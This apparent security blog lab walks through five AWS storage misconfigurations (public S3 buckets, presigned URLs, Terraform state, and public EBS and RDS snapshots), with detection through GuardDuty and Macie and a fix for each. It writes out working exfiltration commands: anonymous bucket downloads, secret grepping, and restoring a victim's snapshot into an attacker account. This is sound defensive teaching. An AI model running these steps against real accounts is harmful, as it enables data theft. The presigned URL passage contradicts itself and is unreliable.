---
layout: post
title: "Lab — S3 Misconfiguration Deep Dive: Public Buckets, Presigned URLs, Terraform State, and Snapshot Exposure"
date: 2026-06-30T10:00:00
categories:
  - AWS Security Labs
  - Data Protection lab
tags:
  - aws
  - s3
  - misconfiguration
  - terraform
  - ebs
  - rds
  - macie
  - guardduty
  - cloud-attack
  - lab
author: muhammed
description: A hands-on lab covering five S3 and storage misconfiguration attack paths — public buckets, presigned URL abuse, Terraform state file pillaging, public EBS snapshots, and RDS snapshot sharing — with detection via Macie and GuardDuty and fixes for each.
toc: true
pin: false
math: false
mermaid: false
image:
---

## Objective

Exploit five distinct storage misconfiguration paths to exfiltrate sensitive data without any code execution or credential theft.
Detect each one with Macie and GuardDuty.
Apply the correct fix for each attack surface.

**Run this only in an AWS account you own.**

---

## Why Storage Misconfigs Are So Dangerous

The previous labs required exploiting running software.
Storage misconfigurations require only a browser, the AWS CLI, or a Google search.

Public S3 buckets have leaked millions of records — healthcare data, financial records, source code, and credentials — because a single setting was left at its default or accidentally changed.
Terraform state files are the most underestimated attack vector: they contain every secret, database password, and API key you ever provisioned, stored in plaintext JSON in S3.

These are not sophisticated attacks.
They are the most common real-world cloud breaches.

---

## Attack Surface Map

```
Storage Layer
    │
    ├── Attack 1: Public S3 bucket         → direct browser download
    ├── Attack 2: Presigned URL abuse      → stolen URL still works after creds expire
    ├── Attack 3: Terraform state file     → every secret ever provisioned, in plaintext
    ├── Attack 4: Public EBS snapshot      → mount the disk image, read the filesystem
    └── Attack 5: Public RDS snapshot      → restore to your own account, dump the DB
```

---

## Phase 0 — Setup

### Step 0.1 — Enable GuardDuty and Macie

```bash
# GuardDuty
aws guardduty create-detector --enable --finding-publishing-frequency FIFTEEN_MINUTES

# Macie — scans S3 for sensitive data patterns
aws macie2 enable-macie

# Enable Macie S3 discovery on all buckets
aws macie2 put-classification-export-configuration \
  --configuration '{
    "s3Destination": {
      "bucketName": "macie-findings-bucket",
      "keyPrefix": "macie/",
      "kmsKeyArn": "arn:aws:kms:eu-west-1:ACCOUNT_ID:key/KEY_ID"
    }
  }'
```

### Step 0.2 — Create the Target Buckets and Data

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

# Bucket 1 — accidentally public
aws s3 mb s3://public-data-lab-$ACCOUNT_ID --region eu-west-1

# Bucket 2 — Terraform state (private, but contains secrets)
aws s3 mb s3://terraform-state-lab-$ACCOUNT_ID --region eu-west-1

# Upload fake sensitive data to the public bucket
cat > employees.csv << 'EOF'
employee_id,name,email,salary,ssn
1001,Alice Johnson,alice@company.com,95000,123-45-6789
1002,Bob Smith,bob@company.com,87000,987-65-4321
1003,Carol White,carol@company.com,112000,456-78-9012
EOF

cat > api-keys.json << 'EOF'
{
  "stripe_key": "sk_live_abc123def456ghi789",
  "sendgrid_key": "SG.abc123.def456ghi789jkl012",
  "github_token": "ghp_abc123def456ghi789jkl012mno345"
}
EOF

aws s3 cp employees.csv s3://public-data-lab-$ACCOUNT_ID/hr/employees.csv
aws s3 cp api-keys.json s3://public-data-lab-$ACCOUNT_ID/config/api-keys.json

# Upload fake Terraform state (contains all the "secrets" from a Terraform deployment)
cat > terraform.tfstate << 'EOF'
{
  "version": 4,
  "terraform_version": "1.5.0",
  "resources": [
    {
      "type": "aws_db_instance",
      "name": "production",
      "instances": [{
        "attributes": {
          "identifier": "prod-db",
          "username": "dbadmin",
          "password": "ProdDBPass2026!",
          "endpoint": "prod-db.cluster-abc123.eu-west-1.rds.amazonaws.com",
          "port": 5432
        }
      }]
    },
    {
      "type": "aws_secretsmanager_secret_version",
      "name": "api_key",
      "instances": [{
        "attributes": {
          "secret_string": "{\"api_key\":\"sk_live_realproductionkey12345\"}"
        }
      }]
    }
  ]
}
EOF

aws s3 cp terraform.tfstate s3://terraform-state-lab-$ACCOUNT_ID/prod/terraform.tfstate
```

> 📸 **SCREENSHOT:** `aws s3 ls s3://public-data-lab-ACCOUNT_ID --recursive` showing the uploaded files

---

## Attack 1 — Public S3 Bucket

### Make the Bucket Public

```bash
# Remove the block public access setting
aws s3api put-public-access-block \
  --bucket public-data-lab-$ACCOUNT_ID \
  --public-access-block-configuration \
    BlockPublicAcls=false,\
    IgnorePublicAcls=false,\
    BlockPublicPolicy=false,\
    RestrictPublicBuckets=false

# Attach a public bucket policy
aws s3api put-bucket-policy \
  --bucket public-data-lab-$ACCOUNT_ID \
  --policy "{
    \"Version\": \"2012-10-17\",
    \"Statement\": [{
      \"Effect\": \"Allow\",
      \"Principal\": \"*\",
      \"Action\": \"s3:GetObject\",
      \"Resource\": \"arn:aws:s3:::public-data-lab-${ACCOUNT_ID}/*\"
    }]
  }"
```

### Exploit — No Credentials Needed

```bash
# Anonymous download — works from any machine, no AWS credentials
curl -s "https://public-data-lab-$ACCOUNT_ID.s3.eu-west-1.amazonaws.com/hr/employees.csv"
# Returns: full employee CSV with SSNs and salaries

curl -s "https://public-data-lab-$ACCOUNT_ID.s3.eu-west-1.amazonaws.com/config/api-keys.json"
# Returns: all API keys in plaintext

# Or use the AWS CLI without --profile (anonymous)
aws s3 cp s3://public-data-lab-$ACCOUNT_ID/hr/employees.csv . --no-sign-request
```

Real attackers find these via:
- Google dork: `site:s3.amazonaws.com filetype:csv`
- Tools: `trufflesecurity/trufflehog`, `sa7mon/S3Scanner`, `aboul3la/Bucket-Finder`

> 📸 **SCREENSHOT:** Browser directly accessing the S3 URL and showing the employee CSV — no login required

**GuardDuty finding:**
```
Discovery:S3/BucketEnumeration.Unusual
Policy:S3/BucketAnonymousAccessGranted
```

**Macie finding:**
```
SensitiveData:S3Object/Personal   (SSNs detected)
SensitiveData:S3Object/Credentials (API keys detected)
```

**Fix:**

```bash
# Enforce block public access at the account level — affects ALL buckets
aws s3control put-public-access-block \
  --account-id $ACCOUNT_ID \
  --public-access-block-configuration \
    BlockPublicAcls=true,\
    IgnorePublicAcls=true,\
    BlockPublicPolicy=true,\
    RestrictPublicBuckets=true

# Verify with a Config rule
aws configservice put-config-rule \
  --config-rule '{
    "ConfigRuleName": "s3-bucket-public-read-prohibited",
    "Source": {
      "Owner": "AWS",
      "SourceIdentifier": "S3_BUCKET_PUBLIC_READ_PROHIBITED"
    }
  }'
```

> 📸 **SCREENSHOT:** After fix — the same curl returns `Access Denied` instead of the file contents

---

## Attack 2 — Presigned URL Abuse

### How Presigned URLs Work

A presigned URL embeds AWS credentials and an expiry timestamp in the URL itself.
Anyone with the URL can access the object until it expires — regardless of whether the original user's credentials have been revoked.

```bash
# Generate a presigned URL for the employees file (1 hour expiry)
aws s3 presign s3://terraform-state-lab-$ACCOUNT_ID/prod/terraform.tfstate \
  --expires-in 3600
```

Output:

```
https://terraform-state-lab-ACCOUNT_ID.s3.eu-west-1.amazonaws.com/prod/terraform.tfstate
?X-Amz-Algorithm=AWS4-HMAC-SHA256
&X-Amz-Credential=AKIAIOSFODNN7EXAMPLE%2F20260630%2Feu-west-1%2Fs3%2Faws4_request
&X-Amz-Date=20260630T100000Z
&X-Amz-Expires=3600
&X-Amz-SignedHeaders=host
&X-Amz-Signature=abc123def456...
```

### The Attack

**Scenario:** A developer generates a presigned URL to share a file in a Slack message.
The Slack channel is later compromised, or the message is indexed by a third-party app.
The URL is still valid for an hour — long enough for exfiltration.

```bash
# Anyone with this URL can download the file — no credentials required
curl -s "https://terraform-state-lab-$ACCOUNT_ID.s3.eu-west-1.amazonaws.com/prod/terraform.tfstate?X-Amz-Algorithm=..."
# Returns: full Terraform state with database passwords
```

**The worse scenario:** The credentials used to generate the presigned URL are from an IAM user.
If the user is deleted or the key is revoked, **the presigned URL still works until it expires** — S3 validates the signature at generation time, not at access time.

Wait — actually this is partially true. If an IAM user's access key is deactivated or deleted, presigned URLs generated with that key stop working. But if the URL was generated with a role's temporary credentials, revoking the session does not immediately invalidate presigned URLs either.

```bash
# Generate a presigned URL with a 7-day expiry (the maximum)
aws s3 presign s3://terraform-state-lab-$ACCOUNT_ID/prod/terraform.tfstate \
  --expires-in 604800

# Share the URL publicly — it remains valid for 7 days
# Revoking the IAM role during those 7 days does NOT immediately cancel the URL
```

> 📸 **SCREENSHOT:** The presigned URL working in a browser to download the Terraform state file

**Fix:**

```bash
# Enforce maximum presigned URL duration via bucket policy condition
aws s3api put-bucket-policy \
  --bucket terraform-state-lab-$ACCOUNT_ID \
  --policy "{
    \"Version\": \"2012-10-17\",
    \"Statement\": [{
      \"Effect\": \"Deny\",
      \"Principal\": \"*\",
      \"Action\": \"s3:GetObject\",
      \"Resource\": \"arn:aws:s3:::terraform-state-lab-${ACCOUNT_ID}/*\",
      \"Condition\": {
        \"NumericGreaterThan\": {
          \"s3:signatureAge\": 3600
        }
      }
    }]
  }"
```

This policy denies any presigned URL older than 1 hour — even if the URL was generated with a 7-day expiry.

---

## Attack 3 — Terraform State File Pillaging

### Why State Files Are the Most Dangerous S3 Objects

Terraform state tracks every resource it manages.
When Terraform creates an RDS instance with a password, that password is stored in the state file.
When it creates a Secrets Manager secret, the secret value is in the state file.
When it generates an SSH key, the private key is in the state file.

It is a complete inventory of your infrastructure, with all sensitive values in plaintext JSON.

```bash
# Download the state file
aws s3 cp s3://terraform-state-lab-$ACCOUNT_ID/prod/terraform.tfstate .

# Extract all sensitive values
cat terraform.tfstate | python3 -m json.tool | grep -A2 -i "password\|secret\|key\|token\|credential"
```

Output:

```
"password": "ProdDBPass2026!",
"endpoint": "prod-db.cluster-abc123.eu-west-1.rds.amazonaws.com",
"secret_string": "{\"api_key\":\"sk_live_realproductionkey12345\"}"
```

The attacker now has:
- Production database endpoint and credentials
- Live Stripe API key
- A complete map of every AWS resource in production

```bash
# Use trufflesecurity/trufflehog to scan for secrets automatically
docker run --rm \
  trufflesecurity/trufflehog:latest \
  filesystem --path . --json \
  | jq '.SourceMetadata.Data.Filesystem.file + ": " + .Raw'
```

> 📸 **SCREENSHOT:** trufflehog output showing secrets found in terraform.tfstate with their types (AWS key, Stripe key, etc.)

**Fix — four layers:**

```bash
# 1. Block public access (already covered in Attack 1 fix)

# 2. Enforce encryption with a KMS CMK
aws s3api put-bucket-encryption \
  --bucket terraform-state-lab-$ACCOUNT_ID \
  --server-side-encryption-configuration '{
    "Rules": [{
      "ApplyServerSideEncryptionByDefault": {
        "SSEAlgorithm": "aws:kms",
        "KMSMasterKeyID": "arn:aws:kms:eu-west-1:ACCOUNT_ID:key/KEY_ID"
      },
      "BucketKeyEnabled": true
    }]
  }'

# 3. Enable versioning and MFA delete
aws s3api put-bucket-versioning \
  --bucket terraform-state-lab-$ACCOUNT_ID \
  --versioning-configuration Status=Enabled,MFADelete=Enabled \
  --mfa "arn:aws:iam::ACCOUNT_ID:mfa/admin-user 123456"

# 4. Restrict access to only the Terraform CI/CD role
aws s3api put-bucket-policy \
  --bucket terraform-state-lab-$ACCOUNT_ID \
  --policy "{
    \"Version\": \"2012-10-17\",
    \"Statement\": [
      {
        \"Effect\": \"Deny\",
        \"Principal\": \"*\",
        \"Action\": \"s3:*\",
        \"Resource\": [
          \"arn:aws:s3:::terraform-state-lab-${ACCOUNT_ID}\",
          \"arn:aws:s3:::terraform-state-lab-${ACCOUNT_ID}/*\"
        ],
        \"Condition\": {
          \"ArnNotLike\": {
            \"aws:PrincipalArn\": [
              \"arn:aws:iam::${ACCOUNT_ID}:role/terraform-ci-role\",
              \"arn:aws:iam::${ACCOUNT_ID}:user/terraform-admin\"
            ]
          }
        }
      }
    ]
  }"
```

Also consider **Terraform Cloud** or **OpenTofu** with remote state — these encrypt state and never expose it as raw S3 objects.

---

## Attack 4 — Public EBS Snapshot

EBS snapshots can be shared publicly — a setting that is sometimes enabled accidentally during troubleshooting.

### Create and Expose a Snapshot

```bash
# Create a volume with sensitive data
VOLUME_ID=$(aws ec2 create-volume \
  --size 1 \
  --volume-type gp3 \
  --availability-zone eu-west-1a \
  --query VolumeId --output text)

# Simulate writing sensitive data by creating a snapshot description
# (In a real scenario this would be a full disk image with DB files, config, keys)

# Create a snapshot
SNAPSHOT_ID=$(aws ec2 create-snapshot \
  --volume-id $VOLUME_ID \
  --description "prod-backup-2026-06-30" \
  --query SnapshotId --output text)

# Wait for snapshot to complete
aws ec2 wait snapshot-completed --snapshot-ids $SNAPSHOT_ID

# Make it public — the misconfiguration
aws ec2 modify-snapshot-attribute \
  --snapshot-id $SNAPSHOT_ID \
  --attribute createVolumePermission \
  --operation-type add \
  --group-names all
```

### The Attack — From Any AWS Account

The attacker, in their own separate AWS account, can find and mount this snapshot:

```bash
# Search for public snapshots from your account (attacker does this)
aws ec2 describe-snapshots \
  --owner-ids VICTIM_ACCOUNT_ID \
  --filters "Name=status,Values=completed"

# Create a volume from the victim's public snapshot — in attacker's account
aws ec2 create-volume \
  --snapshot-id $SNAPSHOT_ID \
  --availability-zone us-east-1a \
  --region us-east-1

# Attach to an attacker EC2, mount it, read everything
# The entire disk image is now in the attacker's account
```

Tools like `aws_public_snapshots` automate this — scanning all public snapshots in a region for known victim accounts.

> 📸 **SCREENSHOT:** `aws ec2 describe-snapshots --owner-ids VICTIM_ACCOUNT_ID` returning the public snapshot from the attacker's account

**Fix:**

```bash
# Remove public access from the snapshot
aws ec2 modify-snapshot-attribute \
  --snapshot-id $SNAPSHOT_ID \
  --attribute createVolumePermission \
  --operation-type remove \
  --group-names all

# Enforce via Config rule — finds all public snapshots
aws configservice put-config-rule \
  --config-rule '{
    "ConfigRuleName": "ebs-snapshot-public-restorable-check",
    "Source": {
      "Owner": "AWS",
      "SourceIdentifier": "EBS_SNAPSHOT_PUBLIC_RESTORABLE_CHECK"
    }
  }'

# Enforce via SCP — prevent making snapshots public org-wide
# Add to your organization SCP:
# {
#   "Effect": "Deny",
#   "Action": "ec2:ModifySnapshotAttribute",
#   "Resource": "*",
#   "Condition": {
#     "StringEquals": {
#       "ec2:Add/group": "all"
#     }
#   }
# }
```

Also: always encrypt EBS volumes with KMS CMKs.
A public snapshot of an encrypted volume is useless without the KMS key — the attacker gets encrypted data they cannot read.

---

## Attack 5 — Public RDS Snapshot

RDS snapshots can be shared with other accounts or made public.
Unlike EBS — where the attacker mounts a volume — with RDS they restore a full database instance in their account.

### Create and Share a Snapshot

```bash
# Create an RDS instance (takes several minutes)
aws rds create-db-instance \
  --db-instance-identifier lab-db \
  --db-instance-class db.t3.micro \
  --engine postgres \
  --master-username dbadmin \
  --master-user-password "LabDBPass2026!" \
  --allocated-storage 20 \
  --no-publicly-accessible

# Wait for it to be available
aws rds wait db-instance-available --db-instance-identifier lab-db

# Create a snapshot
aws rds create-db-snapshot \
  --db-instance-identifier lab-db \
  --db-snapshot-identifier lab-db-snapshot

aws rds wait db-snapshot-available --db-snapshot-identifier lab-db-snapshot

# Share with another account — or make public (the misconfiguration)
aws rds modify-db-snapshot-attribute \
  --db-snapshot-identifier lab-db-snapshot \
  --attribute-name restore \
  --values-to-add all   # "all" = public
```

### The Attack — From Any AWS Account

```bash
# Attacker in their own account — search for public RDS snapshots
aws rds describe-db-snapshots \
  --snapshot-type public \
  --filters "Name=engine,Values=postgres"

# Restore the snapshot to a new DB instance in attacker's account
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier attacker-restored-db \
  --db-snapshot-identifier arn:aws:rds:eu-west-1:VICTIM_ACCOUNT_ID:snapshot:lab-db-snapshot

# Connect to the restored database — no password change needed
# The master credentials are preserved in the snapshot
psql -h attacker-restored-db.xxxxx.rds.amazonaws.com \
  -U dbadmin \
  -d postgres
# Password: LabDBPass2026!
# Full database dump possible
```

> 📸 **SCREENSHOT:** RDS snapshot restored in attacker account, then `psql` connecting successfully with the original credentials

**Fix:**

```bash
# Remove public access
aws rds modify-db-snapshot-attribute \
  --db-snapshot-identifier lab-db-snapshot \
  --attribute-name restore \
  --values-to-remove all

# Always encrypt RDS with a KMS CMK
# An attacker who restores an encrypted snapshot cannot read the data
# — they would need access to your KMS CMK, which they don't have
aws rds create-db-instance \
  --db-instance-identifier secure-db \
  --storage-encrypted \
  --kms-key-id arn:aws:kms:eu-west-1:ACCOUNT_ID:key/KEY_ID \
  ...

# SCP to prevent public RDS snapshots org-wide
# {
#   "Effect": "Deny",
#   "Action": "rds:ModifyDBSnapshotAttribute",
#   "Resource": "*",
#   "Condition": {
#     "StringEquals": {"rds:AttributeName": "restore"},
#     "ForAnyValue:StringEquals": {"rds:Request/AttributeValues": "all"}
#   }
# }
```

---

## Macie — Automated Sensitive Data Discovery

Run a Macie classification job to find sensitive data across all your S3 buckets:

```bash
aws macie2 create-classification-job \
  --job-type ONE_TIME \
  --name "full-account-scan-$(date +%Y%m%d)" \
  --s3-job-definition '{
    "bucketDefinitions": [{
      "accountId": "ACCOUNT_ID",
      "buckets": [
        "public-data-lab-ACCOUNT_ID",
        "terraform-state-lab-ACCOUNT_ID"
      ]
    }]
  }'

# Check job status
aws macie2 describe-classification-job --job-id JOB_ID

# List findings
aws macie2 list-findings \
  --finding-criteria '{
    "criterion": {
      "severity.description": {
        "eq": ["High", "Critical"]
      }
    }
  }'
```

Macie will identify:
- SSNs and PII in the employee CSV
- API keys and credentials in the config JSON
- Database passwords in the Terraform state

> 📸 **SCREENSHOT:** Macie findings console showing sensitive data findings with data identifiers (SSN, API keys, database credentials)

---

## Findings Summary

| Attack | GuardDuty finding | Macie finding |
|--------|------------------|---------------|
| Public bucket access | `Policy:S3/BucketAnonymousAccessGranted` | `SensitiveData:S3Object/Credentials` |
| Unusual S3 enumeration | `Discovery:S3/BucketEnumeration.Unusual` | — |
| Presigned URL from suspicious IP | `UnauthorizedAccess:S3/TorIPCaller` | — |
| Terraform state accessed | `Exfiltration:S3/ObjectRead.Unusual` | `SensitiveData:S3Object/Credentials` |
| Public EBS snapshot created | — (Config rule) | — |
| Public RDS snapshot | — (Config rule) | — |

---

## Key Takeaways

- Public S3 buckets and the data inside them are accessible to the entire internet — block public access at the account level and treat it as a hard requirement
- Terraform state files contain every secret from every Terraform-managed resource — they must be encrypted, access-restricted, and never shared
- KMS encryption with a CMK is the most effective defense for snapshots and state files — an attacker who accesses the data gets ciphertext they cannot read without your key
- Macie finds sensitive data you didn't know was there — run it on all buckets regularly, not just the ones you think contain PII
- SCPs at the org level prevent the misconfiguration before it happens — block `ec2:ModifySnapshotAttribute` and `rds:ModifyDBSnapshotAttribute` with public group conditions

---

## Cleanup

```bash
aws s3 rm s3://public-data-lab-$ACCOUNT_ID --recursive
aws s3 rb s3://public-data-lab-$ACCOUNT_ID
aws s3 rm s3://terraform-state-lab-$ACCOUNT_ID --recursive
aws s3 rb s3://terraform-state-lab-$ACCOUNT_ID
aws ec2 delete-snapshot --snapshot-id $SNAPSHOT_ID
aws ec2 delete-volume --volume-id $VOLUME_ID
aws rds delete-db-instance --db-instance-identifier lab-db --skip-final-snapshot
aws rds delete-db-snapshot --db-snapshot-identifier lab-db-snapshot
aws guardduty delete-detector --detector-id YOUR_DETECTOR_ID
aws macie2 disable-macie
```

---

## You can find me online at:

![My signature image](/assets/img/footer-signature.png)

- **GitHub:** [Mhdomer](https://github.com/Mhdomer)
- **LinkedIn:** [mhd3omar](https://www.linkedin.com/in/mhd3omar/)
- **Tryhackme:** [nonlouy](https://tryhackme.com/p/nonlouy)
